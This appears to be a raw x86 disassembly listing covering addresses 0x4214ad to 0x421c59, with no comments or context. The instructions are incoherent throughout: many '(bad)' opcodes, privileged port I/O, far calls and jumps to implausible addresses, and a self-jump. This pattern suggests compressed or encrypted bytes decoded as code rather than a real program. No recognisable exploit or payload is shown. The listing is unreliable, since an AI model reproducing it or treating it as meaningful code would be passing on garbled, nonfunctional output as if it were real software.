  4214ad:	ins    DWORD PTR es:[edi],dx
  4214ae:	es call 0xb6a6:0x70e0813e
  4214b6:	out    0xee,al
  4214b8:	retf   
  4214b9:	(bad)  
  4214ba:	pop    ebx
  4214bb:	adc    DWORD PTR [eax+0x7c],ebx
  4214be:	and    dl,dh
  4214c0:	cmc    
  4214c1:	sub    BYTE PTR [ebp+0x3c],0x30
  4214c5:	jmp    0xf07ffe1e
  4214ca:	cs mov al,0x77
  4214cd:	add    eax,0xc1230019
  4214d2:	sub    BYTE PTR [edx+0x5c],ah
  4214d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4214d6:	xor    al,0x4c
  4214d8:	rol    DWORD PTR [edi+edx*1],1
  4214db:	pop    ss
  4214dc:	push   esi
  4214dd:	or     al,0xb2
  4214df:	fnstenv fs:[ebx]
  4214e2:	push   es
  4214e3:	es push edi
  4214e5:	int3   
  4214e6:	ret    
  4214e7:	jl     0x421530
  4214e9:	sbb    eax,0x146a79a0
  4214ee:	push   ebp
  4214ef:	pop    ss
  4214f0:	outs   dx,DWORD PTR ds:[esi]
  4214f1:	mov    ss,WORD PTR [edi]
  4214f3:	sub    ebp,DWORD PTR [edi+0x4f]
  4214f6:	cmp    bh,al
  4214f8:	dec    eax
  4214f9:	cli    
  4214fa:	adc    esi,DWORD PTR [eax]
  4214fc:	add    ch,ch
  4214fe:	dec    ecx
  4214ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421500:	xchg   ecx,eax
  421501:	lods   al,BYTE PTR ds:[esi]
  421502:	adc    dl,bh
  421504:	jecxz  0x421537
  421506:	loop   0x4214f9
  421508:	add    ch,BYTE PTR [eax+0x110b7558]
  42150e:	enter  0x8d95,0x75
  421512:	push   edx
  421513:	pop    ds
  421514:	lea    eax,[edx]
  421516:	adc    al,0x76
  421518:	inc    eax
  421519:	pop    edi
  42151a:	cli    
  42151b:	adc    al,dl
  42151d:	ficomp WORD PTR [eax+ecx*1-0x3f]
  421521:	or     ecx,ebx
  421523:	shl    BYTE PTR [ebx+0x73],cl
  421526:	dec    ecx
  421527:	jle    0x42155c
  421529:	pop    DWORD PTR [edx+0x243587f7]
  42152f:	out    0x4d,al
  421531:	lods   eax,DWORD PTR ds:[esi]
  421532:	pop    ebp
  421533:	pop    edx
  421534:	adc    al,0x98
  421536:	call   0xdcf9b358
  42153b:	push   eax
  42153c:	pop    esi
  42153d:	and    BYTE PTR [esi],bl
  42153f:	xchg   BYTE PTR [edx],ah
  421541:	jns    0x42158f
  421543:	and    cl,BYTE PTR [ebp+0x7f490906]
  421549:	push   esi
  42154a:	sub    dh,0x6f
  42154d:	cmc    
  42154e:	sbb    edi,DWORD PTR [esi+0x4f456b2d]
  421554:	(bad)  
  421555:	(bad)  
  421556:	pop    esp
  421557:	mov    bh,0xa1
  421559:	lods   al,BYTE PTR ds:[esi]
  42155a:	add    DWORD PTR [edx+0x4],esp
  42155d:	push   esi
  42155e:	int    0x5d
  421560:	xchg   ebp,eax
  421561:	cmp    DWORD PTR [eax-0x21],edx
  421564:	out    0x25,eax
  421566:	out    dx,eax
  421567:	pop    edi
  421568:	xor    DWORD PTR ds:0xbbfac65a,edi
  42156e:	pop    ecx
  42156f:	cld    
  421570:	or     BYTE PTR [ebp-0x47],ah
  421573:	xor    eax,0x9993328f
  421578:	xchg   edx,eax
  421579:	nop
  42157a:	pop    edi
  42157b:	inc    ebx
  42157c:	adc    esi,eax
  42157e:	mov    eax,0x9cb123d7
  421583:	cmp    bl,BYTE PTR [edi-0x62]
  421586:	mov    ebp,esi
  421588:	jne    0x4215ad
  42158a:	pop    ebp
  42158b:	pop    ss
  42158c:	or     BYTE PTR [edi+0x26],dl
  42158f:	jno    0x4215ab
  421591:	jge    0x42157c
  421593:	sbb    eax,DWORD PTR [ebp+0x35]
  421596:	and    esi,edi
  421598:	daa    
  421599:	mov    ah,0xd4
  42159b:	dec    ebp
  42159c:	fstp   TBYTE PTR [esi-0x3087692b]
  4215a2:	adc    eax,0xeaf76539
  4215a7:	jmp    0xf23c24ca
  4215ac:	cmp    eax,0x32cb041
  4215b1:	mov    ah,0x25
  4215b3:	(bad)  
  4215b4:	jno    0x4215ae
  4215b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4215b7:	jp     0x42161f
  4215b9:	and    esp,DWORD PTR [edi+0x4c0380b9]
  4215bf:	inc    eax
  4215c0:	inc    esi
  4215c1:	dec    esp
  4215c2:	or     BYTE PTR [esi],al
  4215c4:	je     0x4215eb
  4215c6:	daa    
  4215c7:	xchg   ecx,eax
  4215c8:	loop   0x42162e
  4215ca:	fnstsw WORD PTR [eax]
  4215cc:	mov    ch,0x2e
  4215ce:	sub    DWORD PTR [eax+0x10e6aefc],0xf8e5db21
  4215d8:	(bad)  
  4215d9:	xchg   ecx,eax
  4215da:	ss xchg edx,eax
  4215dc:	movq   QWORD PTR [eax],mm4
  4215df:	mov    cl,0xc6
  4215e1:	add    ebp,eax
  4215e3:	jbe    0x421611
  4215e5:	call   0x4425:0x748ff398
  4215ec:	and    DWORD PTR [ebp-0x60],0xa36dbb4e
  4215f3:	push   0x32eda4f2
  4215f8:	enter  0xb1bc,0x6
  4215fc:	mov    ecx,0xcccf58ea
  421601:	popa   
  421602:	sbb    al,cl
  421604:	pop    es
  421605:	jecxz  0x4215ee
  421607:	pop    esi
  421608:	inc    esi
  421609:	xor    DWORD PTR [eax+eiz*4+0x35],0xffffffed
  42160e:	rol    DWORD PTR ds:0xe3a6f245,0xfd
  421615:	or     bh,dh
  421617:	pop    edi
  421618:	sbb    DWORD PTR [ecx],0xcbf88040
  42161e:	push   0x4d
  421620:	das    
  421621:	cmp    eax,0xd2ededac
  421626:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421627:	ins    DWORD PTR es:[edi],dx
  421628:	in     al,0x4d
  42162a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42162b:	mov    edx,gs
  42162d:	mov    bl,0x5a
  42162f:	mov    DWORD PTR [ebx+0x47be7336],0xaf478a96
  421639:	xchg   BYTE PTR [esi+eiz*1+0x73b1e712],al
  421640:	xor    BYTE PTR [ecx],al
  421642:	jl     0x421689
  421644:	xchg   esi,eax
  421645:	adc    ecx,DWORD PTR [edi+ebp*4+0x5e043d96]
  42164c:	push   eax
  42164d:	inc    ecx
  42164e:	xchg   esi,eax
  42164f:	pusha  
  421650:	pop    esp
  421651:	jl     0x421698
  421653:	adc    esi,ebp
  421655:	shl    DWORD PTR [ebx],1
  421657:	stos   BYTE PTR es:[edi],al
  421658:	pop    ebp
  421659:	pop    ebx
  42165a:	(bad)  
  42165b:	cmp    al,0x8c
  42165d:	out    dx,eax
  42165e:	fild   QWORD PTR [eax+0x67]
  421661:	xor    cl,BYTE PTR [edx-0x7a]
  421664:	push   es
  421665:	fdivr  DWORD PTR [edx+ebp*8-0x4c]
  421669:	pop    es
  42166a:	jmp    0xf2009076
  42166f:	inc    ebx
  421670:	sub    ah,bh
  421672:	out    0x83,eax
  421674:	retf   0x1e5e
  421677:	pop    ebp
  421678:	inc    esi
  421679:	add    al,BYTE PTR [eax]
  42167b:	jo     0x4216be
  42167d:	inc    esi
  42167e:	jg     0x4216d2
  421680:	(bad)  [edi]
  421682:	data16 imul BYTE PTR [edi-0x5e]
  421686:	jp     0x421701
  421688:	lods   al,BYTE PTR ds:[esi]
  421689:	sub    bh,bl
  42168b:	outs   dx,DWORD PTR ds:[esi]
  42168c:	ret    
  42168d:	xor    DWORD PTR [ecx],0xffffffad
  421690:	(bad)  
  421691:	push   eax
  421692:	fld    st(3)
  421694:	add    dh,ch
  421696:	and    eax,0x45253ae3
  42169b:	jbe    0x42163c
  42169d:	fnsave [ebx]
  42169f:	mov    esp,0x30e3909d
  4216a4:	jmp    DWORD PTR [ebx+0x67]
  4216a7:	xor    dl,BYTE PTR [ecx+0x4b]
  4216aa:	imul   edi,DWORD PTR [eax+0x49],0xffffffb8
  4216ae:	push   ss
  4216af:	ficom  WORD PTR [edx+0x56b283a7]
  4216b5:	push   0x2e
  4216b7:	dec    edi
  4216b8:	cmp    edi,edi
  4216ba:	or     al,0xf7
  4216bc:	push   es
  4216bd:	ins    BYTE PTR es:[edi],dx
  4216be:	pusha  
  4216bf:	or     DWORD PTR [eax],edi
  4216c1:	dec    esp
  4216c2:	scas   eax,DWORD PTR es:[edi]
  4216c3:	shr    DWORD PTR [edx+0x9fc837c],1
  4216c9:	nop
  4216ca:	(bad)  
  4216cb:	fistp  DWORD PTR [esi+0x7d]
  4216ce:	arpl   WORD PTR [eax+0x77],si
  4216d1:	enter  0x7e07,0x2c
  4216d5:	dec    esp
  4216d6:	sbb    al,0xae
  4216d8:	aas    
  4216d9:	repz dec ebx
  4216db:	mov    cl,0x9b
  4216dd:	and    esp,DWORD PTR [ebx+0x137cb083]
  4216e3:	dec    ebp
  4216e4:	xor    BYTE PTR [esi],dl
  4216e6:	mov    BYTE PTR [esi+edi*1],ch
  4216e9:	(bad)  
  4216eb:	dec    esp
  4216ec:	xchg   ebx,eax
  4216ed:	sub    bl,BYTE PTR [edi]
  4216ef:	xor    dl,BYTE PTR [esi]
  4216f1:	dec    edi
  4216f2:	mov    ecx,0x85a159b3
  4216f7:	(bad)  
  4216f9:	xchg   ebx,eax
  4216fa:	loop   0x42170d
  4216fc:	ret    
  4216fd:	fadd   st(4),st
  4216ff:	retf   
  421700:	(bad)  
  421701:	ja     0x4216ee
  421703:	add    dl,BYTE PTR [eax+0x63]
  421706:	out    0x4b,al
  421708:	pusha  
  421709:	pop    ebp
  42170a:	adc    bl,BYTE PTR [ebx+0x36]
  42170d:	iret   
  42170e:	mov    eax,ds:0x5b212359
  421713:	jbe    0x4216f8
  421715:	sub    al,bl
  421717:	mov    dh,0x6a
  421719:	aas    
  42171a:	in     al,dx
  42171b:	cmc    
  42171c:	add    BYTE PTR [ebp-0x137e7ad8],0x3f
  421723:	inc    ecx
  421724:	adc    DWORD PTR [ebx+0x1ba65ba3],ecx
  42172a:	dec    eax
  42172b:	rcr    BYTE PTR [edi],1
  42172d:	mov    esi,0x63c40d22
  421732:	loop   0x421793
  421734:	dec    edx
  421735:	inc    ebp
  421736:	sub    ebp,edx
  421738:	mov    esp,0x894698e0
  42173d:	(bad)  
  42173e:	pop    esp
  42173f:	js     0x4216e6
  421741:	push   ecx
  421742:	mov    bh,0x16
  421744:	mov    WORD PTR [ebx+0x1b],?
  421747:	pop    ebp
  421748:	push   edx
  421749:	ins    DWORD PTR es:[edi],dx
  42174a:	vpcomub xmm7,xmm2,XMMWORD PTR [edi+0x5cad870f],0x51
  421754:	inc    esi
  421755:	rcr    BYTE PTR [eax-0x2f083502],1
  42175b:	sbb    eax,0xb83bb69c
  421760:	xor    dh,dh
  421762:	mov    ch,0x95
  421764:	mov    bh,BYTE PTR [edi+0x232c7aab]
  42176a:	ds mov edi,0x837ee7f3
  421770:	cmp    dl,BYTE PTR [edi+0x37f668f7]
  421776:	scas   eax,DWORD PTR es:[edi]
  421777:	xchg   BYTE PTR [eax+0x1ecf9110],al
  42177d:	outs   dx,BYTE PTR ds:[esi]
  42177e:	shl    edx,1
  421780:	push   edx
  421781:	(bad)  
  421782:	pop    ecx
  421783:	fwait
  421784:	lahf   
  421785:	or     eax,edx
  421787:	or     ecx,ebx
  421789:	jp     0x421796
  42178b:	(bad)  
  42178c:	mov    esp,0xfa205faf
  421791:	inc    esi
  421792:	inc    ebx
  421793:	inc    ecx
  421794:	add    dl,BYTE PTR [eax]
  421796:	ss dec esi
  421798:	jbe    0x42172a
  42179a:	dec    esi
  42179b:	push   ds
  42179c:	mov    eax,ds:0xcdc3837b
  4217a1:	loope  0x42180b
  4217a3:	loope  0x421821
  4217a5:	out    dx,eax
  4217a6:	in     al,dx
  4217a7:	sub    eax,0x2dede535
  4217ac:	cmp    DWORD PTR [edx],edi
  4217ae:	pusha  
  4217af:	add    al,0x2a
  4217b1:	xor    DWORD PTR [edx-0x31],ecx
  4217b4:	shl    cl,cl
  4217b6:	mov    ebp,0xca1e36d1
  4217bb:	xor    ebx,DWORD PTR [esi]
  4217bd:	sub    al,BYTE PTR [ecx-0x3a25f1eb]
  4217c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4217c4:	imul   eax,DWORD PTR [edx-0xc],0x61
  4217c8:	push   0x7c826f61
  4217cd:	xor    edx,esi
  4217cf:	rcl    dl,cl
  4217d1:	retf   
  4217d2:	dec    eax
  4217d3:	or     BYTE PTR [eax-0x4d],dl
  4217d6:	and    bl,BYTE PTR [edx]
  4217d8:	leave  
  4217d9:	mov    ebp,0x8cfa7d17
  4217de:	and    eax,0x8308da7b
  4217e3:	mov    edi,0x44132da5
  4217e8:	shl    edi,1
  4217ea:	call   0xe384:0xd0462cc1
  4217f1:	push   es
  4217f2:	bound  esi,QWORD PTR [edi+eiz*8]
  4217f5:	fdiv   QWORD PTR [edx]
  4217f7:	cmp    al,0x80
  4217f9:	or     al,0x56
  4217fb:	retf   
  4217fc:	cvtps2pd xmm6,QWORD PTR [edi-0x67e56977]
  421803:	mov    BYTE PTR [esi],bl
  421805:	sbb    BYTE PTR [ebp+0x6e3b2ff5],ah
  42180b:	push   esp
  42180c:	push   ebp
  42180d:	mov    esi,0x4c522ade
  421812:	out    dx,eax
  421813:	sbb    al,0xa7
  421815:	xchg   ecx,eax
  421816:	xchg   ebp,eax
  421817:	jge    0x421897
  421819:	gs mov ecx,0x95d7b323
  42181f:	clc    
  421820:	pop    ebp
  421821:	xchg   ecx,eax
  421822:	pop    ebx
  421823:	pop    edx
  421824:	fsubr  DWORD PTR [ecx]
  421826:	fistp  WORD PTR [ecx]
  421828:	das    
  421829:	pop    edi
  42182a:	mov    bh,0xf7
  42182c:	cmc    
  42182d:	push   0x64
  42182f:	dec    ebp
  421830:	out    0x4,al
  421832:	sub    esi,DWORD PTR [ebp+esi*1-0x692e0a03]
  421839:	dec    esi
  42183a:	je     0x42183f
  42183c:	jmp    0xfd78:0xe71eed2
  421843:	pop    ecx
  421844:	sbb    eax,0x2916e6c1
  421849:	test   esp,edi
  42184b:	test   BYTE PTR [esp+ebx*2+0xc3fdc7],0xb0
  421853:	outs   dx,BYTE PTR ds:[esi]
  421854:	mov    cl,0xf0
  421856:	imul   esp,DWORD PTR [esi-0x31955014],0x8c9e2a4b
  421860:	pop    edi
  421861:	mov    edx,0x37f5aab8
  421866:	push   cs
  421867:	xor    al,0x70
  421869:	xor    eax,0x5bbd43e0
  42186e:	aas    
  42186f:	cmp    eax,0xe1afe1e3
  421874:	ret    
  421875:	mov    DWORD PTR [ebx],esp
  421877:	jns    0x4218d3
  421879:	jp     0x421856
  42187b:	push   0x62
  42187d:	or     al,0xb2
  42187f:	mov    al,0x69
  421881:	sub    al,0xd9
  421883:	sbb    al,0x72
  421885:	rcr    ebx,cl
  421887:	xchg   ebx,eax
  421888:	stos   BYTE PTR es:[edi],al
  421889:	push   ds
  42188a:	dec    edi
  42188b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42188c:	fstp   QWORD PTR ss:[eax]
  42188f:	sbb    eax,eax
  421891:	iret   
  421892:	mov    ds:0xb83920fe,eax
  421897:	mov    dh,0x1
  421899:	loope  0x4218b5
  42189b:	js     0x4218e6
  42189d:	cmp    bh,BYTE PTR ds:0x62c7a52f
  4218a3:	cdq    
  4218a4:	mov    ecx,DWORD PTR [esi+0xef0409d]
  4218aa:	inc    ebp
  4218ab:	cmp    BYTE PTR [ebx-0x312f506a],ah
  4218b1:	xor    ecx,esi
  4218b3:	sbb    cl,BYTE PTR [ecx]
  4218b5:	xchg   ebx,eax
  4218b6:	imul   ebp,DWORD PTR [ecx],0xdc3781
  4218bc:	(bad)  
  4218bd:	fninit 
  4218bf:	shl    BYTE PTR [esi],1
  4218c1:	popf   
  4218c2:	aad    0xb9
  4218c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4218c5:	adc    DWORD PTR [edx],edx
  4218c7:	iret   
  4218c8:	aad    0x5e
  4218ca:	sahf   
  4218cb:	mov    ah,0x1
  4218cd:	or     eax,0x12b1878
  4218d2:	mov    eax,0x436537f6
  4218d7:	sub    BYTE PTR [ebx+0x55],al
  4218da:	popf   
  4218db:	pop    edi
  4218dc:	xor    BYTE PTR [eax-0x6a4063c0],bh
  4218e2:	mov    bl,0x99
  4218e4:	push   ebx
  4218e5:	mov    dh,0xa2
  4218e7:	mov    esi,0x898565d7
  4218ec:	hlt    
  4218ed:	sub    bh,BYTE PTR [edx+0x68]
  4218f0:	fld    st(3)
  4218f2:	mov    BYTE PTR [edi-0x1c],ah
  4218f5:	jbe    0x4218fd
  4218f7:	in     al,dx
  4218f8:	inc    esi
  4218f9:	sub    BYTE PTR [edi+0x60],ch
  4218fc:	pop    es
  4218fd:	mov    DWORD PTR [ebp-0x41a44e97],ecx
  421903:	inc    esi
  421904:	inc    ebp
  421905:	shl    esp,0x7a
  421908:	push   cs
  421909:	dec    esp
  42190a:	out    0xd9,al
  42190c:	sbb    al,0xc2
  42190e:	scas   eax,DWORD PTR es:[edi]
  42190f:	dec    ecx
  421910:	in     eax,dx
  421911:	push   0x77389c6a
  421916:	rol    BYTE PTR [ebx+eiz*4-0x1a5ce695],0x4
  42191e:	push   ds
  42191f:	add    al,0x10
  421921:	ror    esp,cl
  421923:	xlat   BYTE PTR ds:[ebx]
  421924:	pop    esp
  421925:	test   al,0xd6
  421927:	mov    ds:0xdd55c136,al
  42192c:	push   ebx
  42192d:	es ja  0x421997
  421930:	sub    al,0x39
  421932:	mov    bh,BYTE PTR [ecx]
  421934:	adc    DWORD PTR [eax-0x46409441],edx
  42193a:	ja     0x421943
  42193c:	mov    dl,0xa5
  42193e:	cdq    
  42193f:	enter  0xbe77,0x8
  421943:	push   esp
  421944:	mov    DWORD PTR [esp+ecx*2+0x2854575b],ecx
  42194b:	add    al,0x26
  42194d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42194e:	dec    edi
  42194f:	fiadd  WORD PTR [ebp-0x698a6c9e]
  421955:	dec    edi
  421956:	xor    dh,BYTE PTR [eax+0x66]
  421959:	or     eax,DWORD PTR [esi]
  42195b:	pop    ebp
  42195c:	loop   0x42190d
  42195e:	rcr    BYTE PTR [ebx-0x50abc4cd],1
  421964:	mov    dh,0xcf
  421966:	inc    edi
  421967:	mov    dh,0x54
  421969:	mov    ah,0x5
  42196b:	(bad)  
  42196d:	sub    BYTE PTR [edi-0x7e],bl
  421970:	pop    edx
  421971:	mov    ebx,edx
  421973:	sar    DWORD PTR [eax-0x42c79897],1
  421979:	dec    esi
  42197a:	push   esp
  42197b:	mov    ebp,0xd1b8d22
  421980:	loope  0x4219f7
  421982:	pop    esp
  421983:	pop    DWORD PTR [esi-0x63b8a37f]
  421989:	sbb    DWORD PTR [ecx-0x29],edx
  42198c:	jmp    0x44439b69
  421991:	lahf   
  421992:	outs   dx,BYTE PTR ds:[esi]
  421993:	dec    esp
  421995:	mov    dh,0x2a
  421997:	inc    edx
  421998:	jo     0x421998
  42199a:	inc    edx
  42199b:	repnz xchg edx,eax
  42199d:	shl    BYTE PTR [ecx+0x72f0bc85],1
  4219a3:	call   0xf4:0x2129d71a
  4219aa:	inc    edi
  4219ab:	dec    ebp
  4219ac:	mov    bl,0x9e
  4219ae:	lods   eax,DWORD PTR ds:[esi]
  4219af:	pushf  
  4219b0:	loop   0x421960
  4219b2:	scas   al,BYTE PTR es:[edi]
  4219b3:	push   ss
  4219b4:	lea    ebp,[ecx]
  4219b6:	xor    al,0x3b
  4219b8:	repz inc ecx
  4219ba:	std    
  4219bb:	inc    esp
  4219bc:	or     BYTE PTR [esi+0x6f],dl
  4219bf:	ss dec bl
  4219c2:	bound  edx,QWORD PTR [edx-0x6a455a67]
  4219c8:	lahf   
  4219c9:	(bad)  
  4219ca:	(bad)  
  4219cb:	outs   dx,DWORD PTR ds:[esi]
  4219cc:	inc    ecx
  4219cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4219ce:	jp     0x4219f0
  4219d0:	sti    
  4219d1:	mov    dh,0x83
  4219d3:	sbb    al,0x12
  4219d5:	jbe    0x421a2f
  4219d7:	inc    esp
  4219d8:	fwait
  4219d9:	retf   
  4219da:	jb     0x42198d
  4219dc:	jns    0x4219bd
  4219de:	mov    ecx,0xead2ef1d
  4219e3:	inc    esi
  4219e4:	or     al,0x4a
  4219e6:	(bad)  
  4219e8:	mov    eax,0xe75e13e2
  4219ed:	jmp    DWORD PTR ds:0x314e6b92
  4219f3:	fadd   DWORD PTR [ebp-0x26164282]
  4219f9:	stos   DWORD PTR es:[edi],eax
  4219fa:	pop    ebx
  4219fb:	lahf   
  4219fc:	mov    ecx,0xb2ef9dd0
  421a01:	sahf   
  421a02:	push   edx
  421a03:	fsubr  QWORD PTR [esi]
  421a05:	jecxz  0x421a2c
  421a07:	mov    ecx,DWORD PTR [ebx-0x75]
  421a0a:	aaa    
  421a0b:	sbb    eax,0x5ea34b2b
  421a10:	popf   
  421a11:	aad    0x39
  421a13:	fbld   TBYTE PTR [esi]
  421a15:	mov    eax,0x3983ae34
  421a1a:	dec    ebp
  421a1b:	or     bh,BYTE PTR [edi+0x3]
  421a1e:	inc    eax
  421a1f:	xchg   edx,eax
  421a20:	shr    DWORD PTR [eax],cl
  421a22:	loop   0x421a54
  421a24:	pushf  
  421a25:	sub    bh,BYTE PTR [eax-0x52]
  421a28:	les    esp,FWORD PTR [ecx-0x5]
  421a2b:	sub    ch,BYTE PTR [esi-0x4d]
  421a2e:	rol    BYTE PTR [ecx+0x6f2fc12c],0xf8
  421a35:	mov    ds:0x2fd0a5af,al
  421a3a:	out    0x64,al
  421a3c:	cli    
  421a3d:	mov    al,ds:0x3543097
  421a42:	and    dh,al
  421a44:	ret    
  421a45:	out    dx,eax
  421a46:	xchg   ebx,eax
  421a47:	or     edi,esp
  421a49:	mov    fs,WORD PTR [ebp-0x39]
  421a4c:	test   DWORD PTR [eax-0xf],edi
  421a4f:	pop    DWORD PTR [ecx+0x68af2239]
  421a55:	test   al,0x21
  421a57:	mov    eax,0xc3fac434
  421a5c:	lds    edx,FWORD PTR [ebx+ecx*2-0x4b]
  421a60:	mov    ds:0x411cbd44,al
  421a65:	sbb    BYTE PTR [edx+0x42],bh
  421a68:	cmp    ebx,DWORD PTR [edi+0x5b6809a2]
  421a6e:	or     bl,BYTE PTR [ebp-0x5]
  421a71:	xchg   edi,eax
  421a72:	pop    ds
  421a73:	dec    esi
  421a74:	jb     0x421abf
  421a76:	out    dx,al
  421a77:	outs   dx,BYTE PTR ds:[esi]
  421a78:	mov    fs,WORD PTR [eax-0x20]
  421a7b:	test   eax,0x4f8ccf3c
  421a80:	mov    ch,0x98
  421a82:	push   cs
  421a83:	xchg   edi,eax
  421a84:	inc    DWORD PTR [ebx-0x42]
  421a87:	push   ebx
  421a88:	jp     0x421a4e
  421a8a:	jp     0x421a0f
  421a8c:	arpl   WORD PTR [edi+ecx*2+0x42b41da1],bx
  421a93:	mov    esi,0xb359910f
  421a98:	or     eax,0x109b2166
  421a9d:	daa    
  421a9e:	push   ebx
  421a9f:	sub    ah,BYTE PTR [esi+0x36a7a39d]
  421aa5:	fs jmp edx
  421aa8:	mov    eax,0xcae1702f
  421aad:	sub    eax,0x3766c358
  421ab2:	adc    ebp,DWORD PTR [ebp+0x231cde6]
  421ab8:	retf   
  421ab9:	jae    0x421aa4
  421abb:	pop    ss
  421abc:	ret    0x87df
  421abf:	add    al,0x65
  421ac1:	clc    
  421ac2:	sbb    ebp,ecx
  421ac4:	cmc    
  421ac5:	inc    edx
  421ac6:	adc    al,0xcb
  421ac8:	into   
  421ac9:	into   
  421aca:	sbb    edx,DWORD PTR [ecx]
  421acc:	es ins DWORD PTR es:[edi],dx
  421ace:	iret   
  421acf:	neg    DWORD PTR [ecx-0x7084fccd]
  421ad5:	sub    al,0x8d
  421ad7:	xchg   ebp,eax
  421ad8:	dec    ebp
  421ad9:	mov    al,ds:0xc52d52e4
  421adf:	jecxz  0x421aa7
  421ae1:	(bad)  
  421ae2:	sbb    al,0xe7
  421ae4:	mov    ecx,0xa582fb10
  421ae9:	ins    BYTE PTR es:[edi],dx
  421aea:	add    BYTE PTR [ebx+0x22],ah
  421aed:	sub    BYTE PTR [ebx-0xfe61bbc],0xe6
  421af4:	xor    ebx,ebp
  421af6:	mov    eax,ds:0xabe6b5e8
  421afb:	mov    esp,0xd870aa73
  421b00:	or     esi,esi
  421b02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b03:	mov    ds:0x30620408,al
  421b08:	and    al,0x98
  421b0a:	stos   DWORD PTR es:[edi],eax
  421b0b:	fdiv   QWORD PTR [edx+0x60d388e2]
  421b11:	sti    
  421b12:	fdivrp st(7),st
  421b14:	loop   0x421aed
  421b16:	repz mov bl,0x88
  421b19:	repnz cmp DWORD PTR [esi],edx
  421b1c:	cmc    
  421b1d:	(bad)  
  421b1e:	fcmove st,st(0)
  421b20:	mov    esi,0x34db01a5
  421b25:	scas   eax,DWORD PTR es:[edi]
  421b26:	test   al,0x94
  421b28:	loopne 0x421af2
  421b2a:	add    dh,BYTE PTR [ebp+0x79]
  421b2d:	mov    ecx,DWORD PTR [eax-0xb]
  421b30:	in     eax,0x52
  421b32:	int3   
  421b33:	xchg   ebp,eax
  421b34:	cmp    BYTE PTR [eax],0x23
  421b37:	jae    0x421b6b
  421b39:	loop   0x421aed
  421b3b:	lock pop ebx
  421b3d:	xchg   edi,eax
  421b3e:	xchg   ecx,eax
  421b3f:	xchg   bh,bh
  421b41:	shr    DWORD PTR [eax+0x20007907],cl
  421b47:	int3   
  421b48:	or     BYTE PTR [edx+0x4b515fa6],al
  421b4e:	xchg   dh,bh
  421b50:	shl    edi,cl
  421b52:	fnsave [edx-0x338dcf8c]
  421b58:	(bad)  
  421b59:	sbb    al,0x7a
  421b5b:	xor    BYTE PTR [edi-0x60],ch
  421b5e:	pop    edx
  421b5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b60:	mov    DWORD PTR [ecx-0x2ce4a269],edi
  421b66:	fld    QWORD PTR [edi+0x4b]
  421b69:	(bad)  
  421b6a:	test   eax,0xacc2ebd9
  421b6f:	mov    WORD PTR [edx+ecx*4+0x3a],es
  421b73:	mov    DWORD PTR [edx-0x34baa2fc],0x4ff260e5
  421b7d:	rol    BYTE PTR [esi-0x26],1
  421b80:	imul   edx,DWORD PTR [esi-0x44b14703],0xf
  421b87:	sub    edi,esi
  421b89:	jmp    0xe39ad2cd
  421b8e:	aad    0x47
  421b90:	lods   eax,DWORD PTR ds:[esi]
  421b91:	mov    al,0xb7
  421b93:	in     eax,0xca
  421b95:	pop    ebp
  421b96:	icebp  
  421b97:	sub    dl,BYTE PTR [esi]
  421b99:	or     BYTE PTR [ebp-0x3a6f7521],bl
  421b9f:	popa   
  421ba0:	jp     0x421c10
  421ba2:	mov    al,0x43
  421ba4:	pop    es
  421ba5:	xchg   esp,eax
  421ba6:	sahf   
  421ba7:	inc    ebp
  421ba8:	stos   BYTE PTR es:[edi],al
  421ba9:	or     esi,ecx
  421bab:	inc    esp
  421bac:	mov    ds:0x1ecb0c99,eax
  421bb1:	(bad)  
  421bb2:	or     ch,dl
  421bb4:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  421bb6:	sbb    bl,al
  421bb8:	mov    al,ds:0xb64fa1a1
  421bbd:	loope  0x421bb4
  421bbf:	gs pop ds
  421bc1:	pop    ebx
  421bc2:	add    esi,esp
  421bc4:	iret   
  421bc5:	lods   al,BYTE PTR ds:[esi]
  421bc6:	and    al,0x75
  421bc8:	out    0xf7,al
  421bca:	mov    al,ds:0x40dc7573
  421bcf:	shl    dh,cl
  421bd1:	or     eax,0x133e9604
  421bd6:	dec    esp
  421bd7:	or     BYTE PTR [eax-0x15],ch
  421bda:	data16 lods al,BYTE PTR ds:[esi]
  421bdc:	stos   BYTE PTR es:[edi],al
  421bdd:	and    bl,BYTE PTR [eax+esi*2+0x7be2b841]
  421be4:	sti    
  421be5:	xchg   ebp,eax
  421be6:	mov    edi,0x7453059b
  421beb:	push   eax
  421bec:	paddd  mm1,QWORD PTR [ebx-0x7dab57be]
  421bf3:	shl    BYTE PTR [edi-0x33],0x87
  421bf7:	mov    ebx,0x48304d2e
  421bfc:	test   eax,0x81287ae
  421c01:	jno    0x421b87
  421c03:	sub    edi,DWORD PTR [edx-0x1c]
  421c06:	mov    eax,0x811dd5d3
  421c0b:	push   es
  421c0c:	cmp    dl,dh
  421c0e:	fnsave [edx]
  421c10:	cmp    ch,ah
  421c12:	cmp    BYTE PTR ds:0xe13a504c,dh
  421c18:	pop    esi
  421c19:	push   edx
  421c1a:	ds mov ebp,0x9ac1e1b8
  421c20:	xchg   ebp,eax
  421c21:	xor    DWORD PTR [edx-0x4d],ebp
  421c24:	inc    edx
  421c25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c26:	mov    cl,0xa
  421c28:	cmp    DWORD PTR [edi+0x1e3cef48],edx
  421c2e:	push   ecx
  421c2f:	jns    0x421c7c
  421c31:	lock push ebp
  421c33:	cld    
  421c34:	idiv   BYTE PTR ds:0x20790058
  421c3a:	mov    edi,0x148de673
  421c3f:	nop
  421c40:	xor    eax,0x9bb36b08
  421c45:	fisub  DWORD PTR [ebx-0x70]
  421c48:	sbb    ah,BYTE PTR [esi]
  421c4a:	push   0x3a6a5878
  421c4f:	cmp    eax,0x804c06ae
  421c54:	hlt    
  421c55:	inc    eax
  421c56:	sti    
  421c57:	push   ss
  421c58:	push   edx
  421c59:	xchg   ebx,eax
